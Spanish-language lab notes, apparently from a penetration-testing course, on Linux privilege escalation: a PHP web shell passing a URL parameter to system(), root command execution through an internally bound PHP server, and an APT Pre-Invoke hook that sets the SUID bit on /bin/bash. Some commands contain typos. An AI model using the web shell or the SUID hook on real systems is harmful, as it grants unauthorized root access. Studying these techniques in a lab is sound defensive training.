> Pueden ser puertos y los servicios que corren en ellos o servicios de configuracion

## Preparacion
- Descargamos una imagen de ubuntu y lo corremos hacer port forwarding -p80:80
- Actualizamos, iniciamos apache2 y hacemos el archivo para lograr ejecutar comandos por url
```php
apt update
apt install apacyhwe2 php nano curl net-tools

cd /var/www/html
service apache2 start

rm index.html
nano cmd.php

----------------------------------------
<?php
system($_GET['cmd']);
?>
----------------------------------------
```

- Una vez que obtenemos la consola de la victima probamos el comando:
```
netstat -nat 2>&1
ps -faux
```
- No aparece nada interesante primero pero si hubiese un servicio que corre internamente:
```
cd /tmp/
cp /var/www/html/cmd.php
php -S 127.0.0.1:8000
```
- Probamos de nuevo
```
curl 127.0.0.1:8000/cmd.php?cmd=whoami
```
- Somos root

### Nivel de configuracion
- Nos dirigimos a `cd /etc/systemd/`
```php
nvim apt-update.service

--------------------------------------
[Unit]
Description=update package list

[Service]
Type=oneshot
ExecStart=/usr/bin/apt update
--------------------------------------

nvim apt-update.timer

--------------------------------------
[Unit]
Description=update every 30 seconds

[Timer]
OnUnitActiveSec=30s
Unit=apt-update.service

[Install]
WantedBy=timers.target
--------------------------------------
```
- Estamos creando instrucciones para que se corran en el sistema, en este caso para actualizar
- Primero recargamos
```
systemctl daemon-reload
```
- Despues habilitamos el timer y el service
```
systemctl enable apt-update.timer
systemctl start apt-update.timer

systemctl enable apt-update.service
systemctl start apt-update.service
```
- Como usuarios no privilegiados podemos listar los servicios que corren cada cierto tiempo
```
su savitar
systemctl list-timers
```

- Podes jugar por **pspy** para detectar cuando se ejecuta el proceso pero sera dificil filtrar el momento que se ejecuta por la cantidad de proceso que hay detras.
```
# en la victima como no privilegiado
./pspy

# en la victima como privilegiado
watch -n 1 systemctl list-timers
```
- Detectamos el proceso y tenemos que tener permiso para escribir en este otro directorio
```
chmod o+w /etc/apt/apt.conf.d
```
- Entonces podremos elegir que tareas se ejecutan antes de ejecutar un servicio, como una preinvocacion a este servicio.
```php
su savitar
find / -name apt-update.timer 2>/dev/null
cat /etc/ssystemc/system/apt-update.service

cd /etc/apt
ls -l

nvim 01preinv

--------------------------------------
APT::Update::Pre-Invoke {"chmod u+s /bin/bash"}
--------------------------------------
```


